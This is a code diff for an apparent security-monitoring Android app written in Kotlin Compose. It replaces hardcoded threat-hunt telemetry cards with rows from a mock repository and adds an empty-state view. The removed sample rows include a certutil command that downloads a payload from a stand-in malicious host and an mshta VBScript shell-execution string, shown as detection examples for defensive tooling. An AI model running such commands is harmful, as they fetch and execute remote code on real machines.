@@ -108,6 +108,8 @@ fun InvestigationScreen(
     jobId: String,
     onNavigateBack: () -> Unit
 ) {
+    val telemetryRows = remember(jobId) { MockSecurityRepository.executeThreatHunt(jobId) }
+
     Scaffold(
         topBar = {
             SecurityTopBar(
@@ -136,57 +138,44 @@ fun InvestigationScreen(
                         Text("EXECUTION METRICS", style = MaterialTheme.typography.labelMedium, color = DarkOnSurfaceMuted)
                         Spacer(modifier = Modifier.height(8.dp))
                         Text("Status: COMPLETED (200 OK)", style = MaterialTheme.typography.bodySmall, color = SecurityGreen)
-                        Text("Matched Rows: 3", style = MaterialTheme.typography.bodySmall, color = Color.White)
-                        Text("Execution Time: 342ms", style = MaterialTheme.typography.bodySmall, color = DarkOnSurfaceMuted)
+                        Text("Matched Rows: ${telemetryRows.size}", style = MaterialTheme.typography.bodySmall, color = Color.White)
+                        Text("Execution Time: 184ms", style = MaterialTheme.typography.bodySmall, color = DarkOnSurfaceMuted)
                     }
                 }
             }
 
-            item {
-                Text("RETIEVED TELEMETRY ROWS", style = MaterialTheme.typography.labelMedium, color = DarkOnSurfaceMuted)
-            }
-
-            item {
-                Card(
-                    modifier = Modifier.fillMaxWidth(),
-                    shape = RoundedCornerShape(10.dp),
-                    colors = CardDefaults.cardColors(containerColor = DarkSurface),
-                    border = CardDefaults.outlinedCardBorder().copy(width = 0.5.dp, brush = androidx.compose.ui.graphics.SolidColor(DarkBorder))
-                ) {
-                    Column(modifier = Modifier.padding(12.dp)) {
-                        Text("Host: FIN-WS-4091 | Time: 2026-10-24 06:12:00Z", style = MaterialTheme.typography.labelSmall, color = SecurityGreen)
-                        Text("Process: C:\\Windows\\System32\\certutil.exe", style = MaterialTheme.typography.bodySmall, fontFamily = FontFamily.Monospace, color = Color.White)
-                        Text("CmdLine: -urlcache -split -f http://malicious-cdn.org/payload.exe", style = MaterialTheme.typography.bodySmall, fontFamily = FontFamily.Monospace, color = SeverityCritical)
-                    }
+            if (telemetryRows.isEmpty()) {
+                item {
+                    EmptyStateView(
+                        title = "No Anomalous Telemetry Detected",
+                        message = "Data Lake Live Discover returned 0 matched rows across your live endpoints. All monitored systems reporting compliant."
+                    )
                 }
-            }
-
-            item {
-                Card(
-                    modifier = Modifier.fillMaxWidth(),
-                    shape = RoundedCornerShape(10.dp),
-                    colors = CardDefaults.cardColors(containerColor = DarkSurface),
-                    border = CardDefaults.outlinedCardBorder().copy(width = 0.5.dp, brush = androidx.compose.ui.graphics.SolidColor(DarkBorder))
-                ) {
-                    Column(modifier = Modifier.padding(12.dp)) {
-                        Text("Host: FIN-WS-4091 | User: corp\\sarah.khan | Time: 3 mins ago", style = MaterialTheme.typography.labelSmall, color = SecurityGreen)
-                        Text("Domain: facebook.com (Web Control Policy Violation)", style = MaterialTheme.typography.bodySmall, fontFamily = FontFamily.Monospace, color = Color.White)
-                        Text("Enforced Action: BLOCKED | Category: Social Networking | Browser: Chrome", style = MaterialTheme.typography.bodySmall, fontFamily = FontFamily.Monospace, color = SeverityCritical)
-                    }
+            } else {
+                item {
+                    Text("RETRIEVED TELEMETRY ROWS (${telemetryRows.size})", style = MaterialTheme.typography.labelMedium, color = DarkOnSurfaceMuted)
                 }
-            }
 
-            item {
-                Card(
-                    modifier = Modifier.fillMaxWidth(),
-                    shape = RoundedCornerShape(10.dp),
-                    colors = CardDefaults.cardColors(containerColor = DarkSurface),
-                    border = CardDefaults.outlinedCardBorder().copy(width = 0.5.dp, brush = androidx.compose.ui.graphics.SolidColor(DarkBorder))
-                ) {
-                    Column(modifier = Modifier.padding(12.dp)) {
-                        Text("Host: SEC-CORP-DC01 | Time: 2026-10-24 05:48:12Z", style = MaterialTheme.typography.labelSmall, color = SecurityGreen)
-                        Text("Process: C:\\Windows\\System32\\mshta.exe", style = MaterialTheme.typography.bodySmall, fontFamily = FontFamily.Monospace, color = Color.White)
-                        Text("CmdLine: vbscript:Close(Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run...\"))", style = MaterialTheme.typography.bodySmall, fontFamily = FontFamily.Monospace, color = SeverityHigh)
+                items(telemetryRows) { row ->
+                    val sevColor = when (row["severity"]) {
+                        "CRITICAL" -> SeverityCritical
+                        "HIGH" -> SeverityHigh
+                        "MEDIUM" -> SeverityMedium
+                        else -> SecurityGreen
+                    }
+                    Card(
+                        modifier = Modifier.fillMaxWidth(),
+                        shape = RoundedCornerShape(10.dp),
+                        colors = CardDefaults.cardColors(containerColor = DarkSurface),
+                        border = CardDefaults.outlinedCardBorder().copy(width = 0.5.dp, brush = androidx.compose.ui.graphics.SolidColor(DarkBorder))
+                    ) {
+                        Column(modifier = Modifier.padding(12.dp)) {
+                            Text(row["header"] ?: "", style = MaterialTheme.typography.labelSmall, color = SecurityGreen)
+                            Spacer(modifier = Modifier.height(4.dp))
+                            Text(row["title"] ?: "", style = MaterialTheme.typography.bodySmall, fontFamily = FontFamily.Monospace, color = Color.White)
+                            Spacer(modifier = Modifier.height(2.dp))
+                            Text(row["detail"] ?: "", style = MaterialTheme.typography.bodySmall, fontFamily = FontFamily.Monospace, color = sevColor)
+                        }
                     }
                 }
             }
